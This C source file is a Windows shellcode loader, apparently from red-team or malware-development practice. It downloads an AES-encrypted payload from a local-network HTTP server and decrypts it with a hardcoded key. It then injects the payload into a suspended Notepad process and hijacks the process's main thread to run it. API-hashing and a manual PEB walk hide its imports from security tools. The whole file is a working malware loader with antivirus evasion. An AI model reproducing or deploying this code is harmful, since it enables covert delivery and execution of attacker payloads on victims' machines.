#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include "aes.h"
#include <winternl.h>

#define HASH_CreateProcessA 0xAEB52E19
#define HASH_VirtualAllocEx 0xF36E5AB4
#define HASH_WriteProcessMemory 0x6F22E8C8
#define HASH_VirtualProtectEx 0xD812922A
#define HASH_GetThreadContext 0xEBA2CFC2
#define HASH_SetThreadContext 0x7E20964E
#define HASH_KERNEL32_DLL 0x6DDB9555



// import wininet.lib

#pragma comment (lib, "Wininet.lib")
#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
#define TARGET_PROCESS "Notepad.exe"
// basic shellcode loader that have the shellcode embedded within the file

// set to 1 for error logs

#define DEBUG


// defining the API that we want to import using custom GetModuleHandle and GetProcAddress on runtime

typedef BOOL (WINAPI* fnCreateProcessA)(
    IN LPCSTR lpApplicationName,
    IN LPSTR lpCommandLine,
    IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN BOOL bInheritHandles,
    IN DWORD dwCreationFlags,
    IN LPVOID lpEnvironment,
    IN LPCSTR lpCurrentDirectory,
    IN LPSTARTUPINFOA lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation
);

typedef LPVOID (WINAPI* fnVirtualAllocEx)(
    IN HANDLE hProcess,
    IN LPVOID lpAddress,
    IN SIZE_T dwSize,
    IN DWORD flAllocationType,
    IN DWORD flProtect
);

typedef BOOL (WINAPI* fnWriteProcessMemory)(
    IN HANDLE hProcess,
    IN LPVOID lpBaseAddress,
    IN LPCVOID lpBuffer,
    IN SIZE_T nSize,
    OUT SIZE_T* lpNumberOfBytesWritten
);

typedef BOOL (WINAPI* fnVirtualProtectEx)(
    IN HANDLE hProcess,
    IN LPVOID lpAddress,
    IN SIZE_T dwSize,
    IN DWORD flNewProtect,
    OUT PDWORD lpflOldProtect
);

typedef BOOL (WINAPI* fnGetThreadContext)(
    IN HANDLE hThread,
    IN OUT LPCONTEXT lpContext
);

typedef BOOL (WINAPI* fnSetThreadContext)(
    IN HANDLE hThread,
    IN CONST CONTEXT* lpContext
);



DWORD HashStringDjb2A(_In_ LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}


HMODULE GetModuleHandleCustom(DWORD dwModuleNameHash) {

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB      pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB      pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA            pLdr  = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte  = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {

		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {

			// Converting `FullDllName.Buffer` to upper case string
			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {
				UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
				i++;
			}
			UpperCaseDllName[i] = '\0';

			// hashing `UpperCaseDllName` and comparing the hash value to that's of the input `dwModuleNameHash`
			if (HashStringDjb2A(UpperCaseDllName) == dwModuleNameHash)
				return pDte->Reserved2[0];

		}
		else {
			break;
		}

		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	}

	return NULL;
}



FARPROC GetProcAddressCustom(HMODULE hModule, DWORD dwApiNameHash) {

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER         pImgDosHdr			  = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	PIMAGE_NT_HEADERS         pImgNtHdrs			  = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	IMAGE_OPTIONAL_HEADER     ImgOptHdr			  = pImgNtHdrs->OptionalHeader;

	PIMAGE_EXPORT_DIRECTORY   pImgExportDir		  = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);


	PDWORD  FunctionNameArray	= (PDWORD)(pBase + pImgExportDir->AddressOfNames);
	PDWORD  FunctionAddressArray	= (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
	PWORD   FunctionOrdinalArray	= (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
		CHAR*	pFunctionName       = (CHAR*)(pBase + FunctionNameArray[i]);
		PVOID	pFunctionAddress    = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

		// Hashing every function name pFunctionName
		// If both hashes are equal then we found the function we want
		if (dwApiNameHash == HashStringDjb2A(pFunctionName)) {
			return pFunctionAddress;
		}
	}

	return NULL;
}

BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {

    PBYTE pTmpBytes = NULL;

    PBYTE pBytes = NULL;

    SSIZE_T sSize = 0;

    DWORD dwBytesRead = 0;

    HINTERNET hInternet = NULL;

    HINTERNET hInternetFile = NULL;
    // open an hInternet Handle
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

    hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

    if (hInternetFile == NULL) {
        #ifdef DEBUG
        printf("[!] InternetOpenUrlW failed with code: %d \n", GetLastError());
        #endif
        return FALSE;
    }

    // Allocate a temp 1024 bytes memory region
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE)
    {

        // InternetReadFile will report less read bytes if the final chunk is less than 1024 bytes
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            #ifdef DEBUG
            printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
            #endif
            return FALSE;
        }

        // update the amount of readable bytes to the total size
        sSize += dwBytesRead;

        if (pBytes == NULL) { // if pBytes haven't been allocated yet.
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        } else { // Relloc every time sSize updates
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            return FALSE;
        }

        // Add the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }

    }

        InternetCloseHandle(hInternet);
        InternetCloseHandle(hInternetFile);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

        *sPayloadBytes = pBytes;
        *sPayloadSize = sSize;

        LocalFree(pTmpBytes);
        #ifdef DEBUG
        printf("[+] Size of payload: %d \n", sSize);
        #endif
        return TRUE;

}



unsigned char AesKey[] = {
	0xFA, 0xD7, 0x41, 0xEE, 0x57, 0x3C, 0xDA, 0x0C, 0x85, 0x5B, 0xCC, 0x8F, 0x33, 0xEF, 0x70, 0xBC,
	0x9F, 0x13, 0x0E, 0x0E, 0x67, 0xBC, 0x4D, 0xDB, 0x9D, 0x87, 0xEE, 0x35, 0x19, 0xB5, 0xBA, 0x0F };


unsigned char AesIv[] = {
	0x42, 0x88, 0x75, 0xDF, 0xC0, 0xB1, 0x54, 0x7C, 0x7C, 0x01, 0x16, 0x58, 0xC2, 0xE3, 0x94, 0xBA };
// for debugging only

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}
BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {

	struct	AES_ctx AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);

	return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {

    fnCreateProcessA pCreateProcessA = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_CreateProcessA);

    CHAR lpPath [MAX_PATH * 2];
    CHAR WinDirectory [MAX_PATH];

    // STARTUPINFO struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    STARTUPINFO Si = { 0 };

    // PROCESS_INFORMATION struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // typedef struct _PROCESS_INFORMATION {
    //  HANDLE hProcess;
    //  HANDLE hThread;
    //  DWORD  dwProcessId;
    //  DWORD  dwThreadId;
    //} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

    PROCESS_INFORMATION Pi = { 0 };


    // Wipe the structs to be sure
    RtlSecureZeroMemory( &Si , sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(ProcessorInformation));

    Si.cb = sizeof(STARTUPINFO);

    // Get the name of the %WINDIR% variable to determine the exact location of a file

    if (!GetEnvironmentVariableA("WINDIR", WinDirectory, MAX_PATH)) {
        #ifdef DEBUG
        printf("[!] GetEnviromentVariableA failed with error: %d \n", GetLastError());
        #endif
        return FALSE;
    }
    // Creating the full path for the executable
    sprintf(lpPath, "%s\\System32\\%s", WinDirectory, lpProcessName);
    #ifdef DEBUG
    printf("[i] Running : \"%s\" ... ", lpPath);
    #endif
    if (!pCreateProcessA(
        NULL, // not needed
        lpPath, // full path of the executable
        NULL, // not needed
        NULL, // not needed
        FALSE, // set inherit to False
        CREATE_SUSPENDED, // important: set process to start suspended
        NULL, // not needed unless there's something about environment
        NULL, // idk
        &Si, // pointer to the STARTUPINFO struct
        &Pi // Pointer to the PROCESSINFO struct
    )) {

        #ifdef DEBUG
        printf("[!] CreateProcessA failed to create process %s at %s with error: %d\n ", lpProcessName, lpPath, GetLastError());
        #endif
        return FALSE;
    }

    #ifdef DEBUG
    printf("[+] Done\n");
    #endif

    // return PID, Process and thread handle
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread  = Pi.hThread;

    // Ensure that we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

    // else return false
    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {

    fnVirtualAllocEx pVirtualAllocEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualAllocEx);

    fnWriteProcessMemory pWriteProcessMemory = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_WriteProcessMemory);

    fnVirtualProtectEx pVirtualProtectEx = GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_VirtualProtectEx);

    SIZE_T lpNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    *pShellcodeAddress = pVirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process

    if (*pShellcodeAddress == NULL) {
        #ifdef DEBUG
        printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
        #endif
        return FALSE;
    }

    #ifdef DEBUG
    printf("\n[!] pShellcodeAddress allocated at 0x%p of Size %d\n", *pShellcodeAddress, sSizeOfShellcode);
    #endif
    if (!pWriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
        #ifdef DEBUG
        printf("[!] WriteProcessMemory failed with error : %d\n", GetLastError());
        #endif
        return FALSE;
    }

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!pVirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect failed with error : %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {

    fnGetThreadContext pGetThreadContext =
        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_GetThreadContext);

    fnSetThreadContext pSetThreadContext =
        GetProcAddressCustom(GetModuleHandleCustom(HASH_KERNEL32_DLL), HASH_SetThreadContext);

    CONTEXT ThreadContext = {
        .ContextFlags =  CONTEXT_CONTROL
    };

    // Get thread information
    if (!pGetThreadContext(hThread, &ThreadContext)) {
        #ifdef DEBUG
        printf("[!] GetThreadContext failed with error: %d\n", GetLastError());
        #endif
        return FALSE;
    }
    // Hijack target address
    ThreadContext.Rip = pAddress;

    // Write thread
    if (!pSetThreadContext(hThread, &ThreadContext)) {
        #ifdef DEBUG
        printf("[!] SetThreadContext failed with error: %d\n", GetLastError());
        #endif
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    PBYTE pEncrypted = NULL;
    size_t sSizeOfPayload = 0;
    DWORD flOldProtect = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pShellcodeAddress = NULL;

    // 1: Get encrypted payload

    if (LoadLibraryA("KERNEL32.DLL") == NULL) {
		printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
		return 0;
	}

    if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
        #ifdef DEBUG
        printf("[!] Failed to get the payload\n ");
        #endif
        return -1;
    }

    // 2: Decrypt Payload


    if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
        #ifdef DEBUG
        printf("[!] Failed to decrypt the buffer \n ");
        #endif
        return -1;
    }

    #ifdef DEBUG
    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
    #endif


    // 3: Create suspended process to inject payload to
    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) return -1;

    // 4: Inject payload to suspended process
    if (!InjectShellcodeToRemoteProcess(hProcess, pEncrypted, sSizeOfPayload, &pShellcodeAddress)) return -1;

    // 5: Hijack thread execution to point to shellcode within the process

    if (!HijackThreadExecution(hThread, pShellcodeAddress)) return -1;

    // 6: Resume thread

    ResumeThread(hThread);

    #ifdef DEBUG
    printf("[+] Executing payload with PID: %d\n", dwProcessId);
    #endif


    return 0;
}
